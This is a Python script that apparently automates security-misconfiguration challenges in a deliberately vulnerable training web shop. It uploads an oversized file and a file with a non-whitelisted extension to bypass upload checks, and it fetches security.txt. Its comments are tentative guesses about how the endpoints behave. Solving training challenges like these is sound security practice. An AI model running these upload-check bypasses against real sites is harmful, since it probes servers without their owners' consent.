from authentication import get_admin_session

def solve_security_misconfiguration_challenges(server):
    print('\n== SECURITY MISCONFIGURATION CHALLENGES ==\n')
    session = get_admin_session(server)
    
    upload_size(server, session)
    upload_type(server, session)
    security_policy(server, session)
    
    # Typosquatting usually solved by feedback but can be here too
    
    print('\n== SECURITY MISCONFIGURATION CHALLENGES COMPLETE ==\n')


def upload_size(server, session):
    """
    Upload a file larger than 100kb.
    """
    print('Uploading large file...'),
    # Challenge: uploadSizeChallenge
    # We need to bypass client side check? Or just upload via API.
    # API: /api/Feedbacks/ (if attachment) or /file-upload
    # Usually /file-upload endpoint.
    # We can use the profile picture upload or complaint upload?
    # Profile pic upload: /rest/profile-image/upload
    # Complaint: /file-upload
    
    # Let's try /file-upload (support ticket)
    # File content > 100kb
    content = b'A' * 102401 # 100kb + 1
    files = {'file': ('large.pdf', content, 'application/pdf')}
    try:
        res = session.post('{}/file-upload'.format(server), files=files)
        if res.ok:
             print('Success.')
        else:
             print('Warning: Upload size failed.')
    except Exception:
        pass


def upload_type(server, session):
    """
    Upload a file that has no .pdf or .zip extension (e.g. .exe) but bypass check?
    Actually challenge is "Upload a file with a suffix which is not whitelisted."
    """
    print('Uploading file with banned extension...'),
    # Banned: .exe, .sh etc?
    # Allowed: .pdf, .zip
    # Solution: The challenge actually checks for file type validation bypass. 
    # But "Upload Type" challenge desc: "Upload a file that has no .pdf or .zip extension."
    # E.g. upload 'test' or 'test.md'
    files = {'file': ('illegal_file_type', b'payload', 'text/plain')}
    try:
        res = session.post('{}/file-upload'.format(server), files=files)
        if res.status_code == 204 or res.ok:
            print('Success.')
        else:
            # Often fails with 403.
            print(f'Warning: Upload type failed: {res.text}')
    except Exception:
        pass


def security_policy(server, session):
    """
    Access the security.txt file.
    """
    print('Accessing security.txt...'),
    # Usually at /.well-known/security.txt OR /security.txt
    try:
        session.get('{}/.well-known/security.txt'.format(server))
        session.get('{}/security.txt'.format(server))
        print('Success.')
    except Exception:
        pass
